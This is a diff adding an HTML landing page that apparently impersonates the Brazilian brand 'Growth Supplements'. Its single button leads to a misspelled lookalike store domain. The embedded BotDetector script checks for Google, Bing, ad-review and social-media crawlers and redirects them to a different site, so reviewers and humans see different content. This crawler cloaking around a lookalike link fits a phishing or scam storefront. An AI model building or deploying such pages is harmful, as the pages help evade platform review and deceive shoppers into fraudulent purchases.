@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Growth Supplements - Somos todos atletas">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Growth Supplements</title>
+    
+    <!-- Bootstrap e Animate.css -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        
+        .link-content {
+            padding: 20px;
+        }
+        
+        .link-image {
+            max-width: 200px;
+            height: auto;
+        }
+        
+        .link-verified {
+            color: #1898d5;
+            margin-left: 8px;
+        }
+        
+        .link-btn {
+            transition: all 0.3s ease;
+            padding: 12px 24px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .link-btn-rounded {
+            border-radius: 25px;
+        }
+        
+        .link-btn:hover {
+            transform: scale(1.02);
+            opacity: 0.9;
+        }
+        
+        #title {
+            font-size: 2rem;
+            margin: 0;
+            color: #000000;
+        }
+        
+        #branding {
+            margin-top: 20px;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        
+        .debug-info {
+            background-color: #f8f9fa;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+            font-family: monospace;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container animated fadeIn">
+        <div class="row d-flex justify-content-center text-center">
+            <div class="col-md-8 link-content">
+                <div class="d-flex flex-column align-items-center" style="color: #000000">
+                    <img src="images/072c8dac234841c51601c58b3b328408.png" id="image" class="link-image" alt="Avatar">
+                    
+                    <div class="d-flex flex-row align-items-center mt-4">
+                        <h1 id="title">Growth Supplements</h1>
+                        <span class="link-verified ml-1" toggle="tooltip" title="Verificar"></span>
+                    </div>
+                    
+                    <p>SOMOS TODOS ATLETAS</p>
+                </div>
+                
+                <div id="links" class="mt-4" role="main">
+                    <div class="my-3">
+                        <a href="https://gsuplamentos.online/" class="btn btn-block btn-primary link-btn link-btn-rounded animated infinite delay-2s" style="background: #1898d5; color: #fff" data-location-url="aPMRmbD9DF">
+                            Confira a nossa loja
+                        </a>
+                    </div>
+                </div>
+                
+                <a href="#" id="branding" style="color: #1898d5">Todos os direitos reservados.</a>
+                
+                <!-- Debug info (hidden by default) -->
+                <div id="debug" class="debug-info"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        class BotDetector {
+            constructor() {
+                this.botPatterns = {
+                    searchEngines: [
+                        /googlebot/i, /googlebot-image/i, /googlebot-video/i,
+                        /googlebot-news/i, /adsbot-google/i, /mediapartners-google/i,
+                        /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
+                        /yandexbot/i, /google-inspectiontool/i, /google-favicon/i
+                    ],
+                    socialMedia: [
+                        /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i
+                    ],
+                    malicious: [
+                        /semrushbot/i, /ahrefsbot/i, /mj12bot/i, /dotbot/i
+                    ]
+                };
+
+                this.redirectUrls = {
+                    searchEngines: 'https://payzuplus.com',
+                    socialMedia: 'https://payzuplus.com/social',
+                    malicious: 'https://payzuplus.com/blocked',
+                    default: 'https://payzuplus.com'
+                };
+            }
+
+            detectBotType(userAgent) {
+                for (const [type, patterns] of Object.entries(this.botPatterns)) {
+                    if (patterns.some(pattern => pattern.test(userAgent))) {
+                        return type;
+                    }
+                }
+                return null;
+            }
+
+            async analyzeVisitor() {
+                const userAgent = navigator.userAgent;
+                const botType = this.detectBotType(userAgent);
+                
+                const suspicious = {
+                    headless: !('onrendersubtreeactivation' in document),
+                    webdriver: navigator.webdriver,
+                    plugins: navigator.plugins.length === 0,
+                    languages: !navigator.languages || navigator.languages.length === 0
+                };
+
+                return {
+                    isBot: botType !== null,
+                    botType: botType,
+                    userAgent: userAgent,
+                    suspicious: suspicious,
+                    timestamp: new Date().toISOString()
+                };
+            }
+
+            async handleRedirect(analysis) {
+                const debugEl = document.getElementById('debug');
+                
+                // Log para debug (oculto por padrão)
+                debugEl.innerHTML = `
+                    <h3>Informações de Depuração:</h3>
+                    <pre>${JSON.stringify(analysis, null, 2)}</pre>
+                `;
+
+                if (analysis.isBot) {
+                    console.log(`Bot detectado (${analysis.botType}). Redirecionando...`);
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    const redirectUrl = this.redirectUrls[analysis.botType] || this.redirectUrls.default;
+                    window.location.href = redirectUrl;
+                }
+            }
+
+            async init() {
+                try {
+                    const analysis = await this.analyzeVisitor();
+                    await this.handleRedirect(analysis);
+                } catch (error) {
+                    console.error('Erro na detecção:', error);
+                }
+            }
+        }
+
+        // Inicialização quando o DOM estiver pronto
+        document.addEventListener('DOMContentLoaded', () => {
+            const detector = new BotDetector();
+            detector.init();
+        });
+    </script>
+</body>
+</html>
